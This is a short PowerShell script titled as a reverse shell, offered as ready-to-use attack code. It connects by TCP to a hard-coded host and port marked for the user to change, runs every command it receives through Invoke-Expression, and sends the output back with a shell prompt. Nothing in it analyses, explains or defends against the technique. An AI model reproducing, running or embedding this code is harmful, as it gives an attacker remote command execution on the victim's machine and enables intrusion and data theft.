# Revershell with powershell

$client = New-Object System.Net.Sockets.TCPClient('192.168.1.87',6464)  # Change this
$stream = $client.GetStream();
$bytes = new-object System.Byte[] 1024;
while(($i = $stream.Read($bytes, 0, 1024)) -ne 0)
{
  
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
	$sendback = (IEX $data 2>&1 | Out-String )
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
	$stream.Write($sendbyte,0,$sendbyte.Length)
	$stream.Flush()
    

}

$client.Close()

